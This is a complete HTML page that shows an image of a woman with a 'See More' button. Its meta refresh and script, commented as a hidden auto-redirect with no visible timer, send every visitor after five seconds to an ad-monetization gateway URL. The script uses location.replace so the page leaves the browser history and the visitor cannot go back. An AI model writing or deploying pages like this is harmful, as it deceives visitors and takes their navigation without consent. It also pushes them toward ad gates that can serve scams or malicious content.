<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1, viewport-fit=cover"
    />
    <title>Image with Bottom-Left Button</title>

     Fallback: hidden 5s auto-redirect even if JS is off 
    <meta
      http-equiv="refresh"
      content="5;url=https://www.revenuecpmgate.com/ipkpuuud08?key=1756b02182daa3e03505a06e107f2ba0"
    />

    <style>
      /* Color system: primary accent orange, neutral white/black variants */
      :root {
        --accent: #ff6a3d;   /* orange button */
        --accent-end: #ff835a;
        --text-on-accent: #ffffff;
        --img-shadow: 0 8px 30px rgba(0, 0, 0, 0.25);
      }

      html,
      body {
        height: 100%;
      }

      body {
        margin: 0;
        display: grid;
        place-items: center;
        background: #0b0b0c;
        color: #111;
        font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
      }

      /* Wrapper maintains only the image on the page */
      .card {
        position: relative;
        border-radius: 18px;
        overflow: hidden;
        box-shadow: var(--img-shadow);
        max-width: 520px;
        width: min(92vw, 520px);
        line-height: 0; /* remove stray gaps around image */
      }

      .card img {
        display: block;
        width: 100%;
        height: auto;
        object-fit: cover;
        aspect-ratio: 9 / 16; /* keeps a tall poster-like feel on wide screens */
      }

      /* Optional subtle gradient at the very bottom for contrast (no text) */
      .bottom-fade {
        position: absolute;
        inset: auto 0 0 0;
        height: 28%;
        background: linear-gradient(
          to top,
          rgba(0, 0, 0, 0.45),
          rgba(0, 0, 0, 0.12),
          transparent
        );
        pointer-events: none;
      }

      /* Bottom-left pill button over the image */
      .cta {
        position: absolute;
        left: 16px;
        bottom: 16px;
        background: linear-gradient(135deg, var(--accent), var(--accent-end));
        color: var(--text-on-accent);
        border: none;
        border-radius: 999px;
        padding: 12px 18px;
        font-size: 16px;
        font-weight: 700;
        text-decoration: none;
        box-shadow: 0 6px 18px rgba(255, 106, 61, 0.45);
        transition: transform 0.15s ease, box-shadow 0.15s ease;
        display: inline-flex;
        align-items: center;
        justify-content: center;
        -webkit-tap-highlight-color: transparent;
      }

      .cta:active,
      .cta:hover {
        transform: translateY(-1px);
        box-shadow: 0 10px 24px rgba(255, 106, 61, 0.52);
      }

      /* Respect safe areas on iOS when in standalone/PWA */
      @supports (padding: max(0px)) {
        .cta {
          left: max(16px, env(safe-area-inset-left));
          bottom: max(16px, env(safe-area-inset-bottom));
        }
      }
    </style>
  </head>
  <body>
     Only the image with an overlaid bottom-left button 
    <main class="card" aria-label="Promoted image">
      <img
        src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/photo_30_2025-09-02_14-22-31.jpg-9TdZcAWQi6etjaGVbFgwmbpvryGrtJ.jpeg"
        alt="Portrait of a woman in a red dress standing by a mountain lake."
      />
      <div class="bottom-fade" aria-hidden="true"></div>
      <a
        id="seeMore"
        class="cta"
        href="https://www.revenuecpmgate.com/ipkpuuud08?key=1756b02182daa3e03505a06e107f2ba0"
        rel="noopener"
      >
        See More
      </a>
    </main>

    <script>
      // Mobile-friendly auto-redirect after 5 seconds, no visible timer
      (function () {
        const target =
          "https://www.revenuecpmgate.com/ipkpuuud08?key=1756b02182daa3e03505a06e107f2ba0";
        const btn = document.getElementById("seeMore");
        let navigated = false;

        function go(now = false) {
          if (navigated) return;
          navigated = true;
          // Same-tab navigation is most reliable on mobile
          if (now) {
            window.location.href = target;
          } else {
            // replace avoids keeping this page in the back stack
            window.location.replace(target);
          }
        }

        // Immediate navigate on click/tap
        btn.addEventListener("click", function (e) {
          // Allow native anchor behavior, but ensure single navigation
          if (navigated) {
            e.preventDefault();
            return;
          }
          navigated = true;
          // Let the default href handle it; as backup, force navigate
          setTimeout(() => {
            if (document.visibilityState !== "hidden") {
              window.location.href = target;
            }
          }, 50);
        });

        // Hidden auto-redirect in 5 seconds
        setTimeout(() => go(false), 5000);
      })();
    </script>
  </body>
</html>
